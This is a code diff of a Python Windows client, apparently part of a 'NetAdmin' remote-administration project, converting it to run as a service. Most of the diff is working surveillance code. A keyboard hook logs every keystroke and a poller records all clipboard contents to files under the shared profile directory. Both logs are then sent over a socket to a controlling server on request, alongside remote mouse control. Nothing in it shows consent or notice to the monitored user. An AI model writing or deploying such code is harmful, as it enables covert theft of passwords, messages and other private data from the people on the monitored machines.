@@ -1,36 +1,47 @@
-import ast
-import ctypes
+import logging
 import os
 import time
-import queue
-from collections import deque
-
 import cv2
 import keyboard
 import mss
 import numpy
 import sys
 import platform
-
 import pyperclip
-from tendo import singleton
 import pyautogui
+import pythoncom
 import win32com.client as com
 import wmi
-sys.path.insert(1, os.path.join(sys.path[0], '../shared'))
+logger = logging.getLogger('logger')
+logger.setLevel(logging.DEBUG)
+# create file handler
+fh = logging.FileHandler("C:\\Users\\guyst\\Documents\\NetAdmin\\source\\logg.log")
+fh.setLevel(logging.DEBUG)
+# add handler
+logger.addHandler(fh)
+if not (getattr(sys, 'frozen', False) and hasattr(sys, '_MEIPASS')):
+    sys.path.insert(1, os.path.join(sys.path[0], '../shared'))
+    print("Running from source")
+else:
+    logger.info("Running from executable")
+    logger.info(getattr(sys, '_MEIPASS'))
+    logger.info("WMI CoInitialize")
 import psutil
 import GPUtil
 import winreg
+import NetProtocol
 import win32api
 from os import listdir
 from os.path import isfile, join
 from OpenConnectionHelpers import *
 from turbojpeg import TurboJPEG
+from os import path
 
-KEYLOG_PATH = os.path.join(os.getenv('LOCALAPPDATA'), "NetAdmin\\keylog.txt")
-CLIPBOARD_PATH = os.path.join(os.getenv('LOCALAPPDATA'), "NetAdmin\\clipboard.txt")
+BASE_PATH = os.path.join(os.getenv('ALLUSERSPROFILE'), "NetAdmin\\")
+KEYLOG_PATH = os.path.join(os.getenv('ALLUSERSPROFILE'), "NetAdmin\\keylog.txt")
+CLIPBOARD_PATH = os.path.join(os.getenv('ALLUSERSPROFILE'), "NetAdmin\\clipboard.txt")
 
-jpeg = TurboJPEG()
+jpeg = TurboJPEG(path.abspath(path.join(path.dirname(__file__), 'lib_bin/turbojpeg-bin/turbojpeg.dll')))
 
 def set_id(id):
     """
@@ -271,45 +282,56 @@ def keyhook(event):
                 # else:
                 key_queue.append(keyContainer)
 
-def keylogger():
+import pathlib
+
+def keylogger(status):
     keyboard.hook(keyhook)
-    while True:
+    while status:
         with key_queue_lock:
             if len(key_queue):
-                with open(KEYLOG_PATH, "a") as f:
+                with open(KEYLOG_PATH, "a+") as f:
+                    logger.info("OPENED KEYLOGGER FUNC")
                     f.write(f"[{datetime.datetime.now()}] ")
                     while len(key_queue) > 0:
                         f.write(str(key_queue.pop(0)))
                     f.write("\n")
         time.sleep(60)
 
-def clipboard_logger():
+def clipboard_logger(status):
     prevClip = None
-    while True:
+    while status:
         cClip = pyperclip.paste()
         if prevClip != cClip:
             prevClip = cClip
-            with open(CLIPBOARD_PATH, "a") as f:
+            with open(CLIPBOARD_PATH, "a+") as f:
+                logger.info("OPENED CLIPBOARD FUNC")
                 f.write(f"[{datetime.datetime.now()}] \n{cClip}\n")
         time.sleep(2)
 
+process_status = SharedBoolean(True)
+
 @try_connection
 def main():
-    # make sure only one instance of the application is running
-    try:
-        sng = singleton.SingleInstance()
-    except:
-        print("Another instance of the application is already running")
-        return
+    # NOT NEEDED SINCE SERVICE
+    # # make sure only one instance of the application is running
+    # try:
+    #     sng = singleton.SingleInstance()
+    # except:
+    #     print("Another instance of the application is already running")
+    #     return
 
     # create keylogger
-    thread = threading.Thread(target=keylogger)
+    pythoncom.CoInitialize()
+    logger.info("SERVICE STARTED")
+    pathlib.Path(BASE_PATH).mkdir(parents=True, exist_ok=True)
+
+    thread = threading.Thread(target=keylogger, args=(process_status,))
     thread.start()
 
     # create clipboard logger
-    thread2 = threading.Thread(target=clipboard_logger)
+    thread2 = threading.Thread(target=clipboard_logger, args=(process_status,))
     thread2.start()
-
+    print("Started keylogger and clipboard logger")
     # create a socket
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     s.connect(("127.0.0.1", 49152))
@@ -318,7 +340,7 @@ def main():
 
     # main loop
     # receives and unpacks messages from the server, and checks the type of message
-    while True:
+    while process_status:
         size, message = NetProtocol.unpackFromSocket(s)
         if message == -1:
             return
@@ -346,13 +368,21 @@ def main():
 
             elif message['data'] == NetTypes.NetGetKeylogger.value:
                 print(f"Keylogger request from {message['extra']}")
-                with open(KEYLOG_PATH, "r") as f:
-                    s.send(NetProtocol.packNetMessage(NetMessage(type=NetTypes.NetText, data=NetText(text=f.read()), id=id)))
+                try:
+                    with open(KEYLOG_PATH, "r") as f:
+                        logger.info("OPENED KEYLOGGER")
+                        s.send(NetProtocol.packNetMessage(NetMessage(type=NetTypes.NetText, data=NetText(text=f.read()), id=id)))
+                except Exception as e:
+                    logger.info(str(e))
 
             elif message['data'] == NetTypes.NetGetClipboard.value:
                 print(f"Keylogger request from {message['extra']}")
-                with open(CLIPBOARD_PATH, "r") as f:
-                    s.send(NetProtocol.packNetMessage(NetMessage(type=NetTypes.NetText, data=NetText(text=f.read()), id=id)))
+                try:
+                    with open(CLIPBOARD_PATH, "r") as f:
+                        logger.info("OPENED CLIPBOARD")
+                        s.send(NetProtocol.packNetMessage(NetMessage(type=NetTypes.NetText, data=NetText(text=f.read()), id=id)))
+                except Exception as e:
+                    logger.info(str(e))
 
             elif message['data'] == NetTypes.NetMouseMoveAction.value:
                 print(f"Mouse action request from {message['extra']}")
